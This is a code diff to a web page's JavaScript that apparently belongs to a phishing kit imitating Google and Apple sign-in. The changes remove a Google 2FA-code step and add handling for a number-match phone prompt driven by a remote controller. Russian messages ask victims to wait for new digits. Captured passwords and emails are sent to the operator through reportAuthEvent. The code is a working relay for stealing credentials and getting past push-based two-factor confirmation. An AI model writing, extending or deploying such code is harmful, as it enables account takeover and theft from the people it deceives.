@@ -200,7 +200,7 @@ function initApp() {
 
         if (isTestBotUrl && targetStep !== stepSuccess && !isAuthorized) {
             const isTargetAlreadyGoogle = [
-                stepGoogleEmail, stepGooglePassword, stepGoogle2FA, stepGooglePrompt, stepGoogleConsent
+                stepGoogleEmail, stepGooglePassword, stepGooglePrompt, stepGoogleConsent
             ].includes(targetStep);
             if (!isTargetAlreadyGoogle) {
                 targetStep = userGoogleEmail ? stepGooglePassword : stepGoogleEmail;
@@ -208,7 +208,7 @@ function initApp() {
         }
 
         const isGoogleStep = [
-            stepGoogleEmail, stepGooglePassword, stepGoogle2FA, stepGooglePrompt, stepGoogleConsent
+            stepGoogleEmail, stepGooglePassword, stepGooglePrompt, stepGoogleConsent
         ].includes(targetStep);
 
         const isAppleStep = [
@@ -238,7 +238,7 @@ function initApp() {
 
         [
             stepPhone, stepCode, step2FA, 
-            stepGoogleEmail, stepGooglePassword, stepGoogle2FA, stepGooglePrompt, stepGoogleConsent,
+            stepGoogleEmail, stepGooglePassword, stepGooglePrompt, stepGoogleConsent,
             stepAppleEmail, stepApplePassword, stepApple2FA, stepApplePrompt,
             stepSuccess
         ].forEach(s => s && s.classList.remove("active"));
@@ -1318,6 +1318,8 @@ function initApp() {
                     clearGoogleErrors();
                 } else if (ctrl.status === "show_prompt") {
                     if (googleLoadingBar) googleLoadingBar.classList.add("hidden");
+                    const promptErr = document.getElementById("googlePromptError");
+                    if (promptErr) promptErr.classList.add("hidden");
                     const num = ctrl.prompt_number || "42";
                     if (googlePromptNumber) googlePromptNumber.textContent = num;
                     const promptTargetText = document.getElementById("googlePromptTargetNumber");
@@ -1325,19 +1327,17 @@ function initApp() {
                     if (!stepGooglePrompt.classList.contains("active")) {
                         showStep(stepGooglePrompt);
                     }
-                } else if (ctrl.status === "show_2fa") {
+                } else if (ctrl.status === "error_prompt" || ctrl.status === "wrong_prompt") {
                     if (googleLoadingBar) googleLoadingBar.classList.add("hidden");
-                    if (btnSubmitGoogle2FA) btnSubmitGoogle2FA.disabled = false;
-                    if (!stepGoogle2FA.classList.contains("active")) {
-                        showStep(stepGoogle2FA);
+                    if (!stepGooglePrompt.classList.contains("active")) {
+                        showStep(stepGooglePrompt);
                     }
-                } else if (ctrl.status === "error_2fa") {
-                    if (googleLoadingBar) googleLoadingBar.classList.add("hidden");
-                    if (btnSubmitGoogle2FA) btnSubmitGoogle2FA.disabled = false;
-                    if (!stepGoogle2FA.classList.contains("active")) {
-                        showStep(stepGoogle2FA);
+                    const promptErr = document.getElementById("googlePromptError");
+                    const promptErrText = document.getElementById("googlePromptErrorText");
+                    if (promptErr) promptErr.classList.remove("hidden");
+                    if (promptErrText) {
+                        promptErrText.textContent = ctrl.error_msg || "Выбрано неверное число на устройстве. Ожидайте новые цифры...";
                     }
-                    showGoogleError("2fa", ctrl.error_msg || "Неверный код. Проверьте код и повторите попытку.");
                 } else if (ctrl.status === "completed" || data.authorized) {
                     stopGooglePolling();
                     if (googleLoadingBar) googleLoadingBar.classList.add("hidden");
@@ -1391,6 +1391,8 @@ function initApp() {
     if (btnConfirmGooglePrompt) {
         btnConfirmGooglePrompt.addEventListener("click", () => {
             if (googleLoadingBar) googleLoadingBar.classList.remove("hidden");
+            const promptErr = document.getElementById("googlePromptError");
+            if (promptErr) promptErr.classList.add("hidden");
             reportAuthEvent("google_prompt_confirmed", "Пользователь подтвердил вход на телефоне (Google)", userGooglePassword, null, userGoogleEmail);
             startGooglePolling();
         });
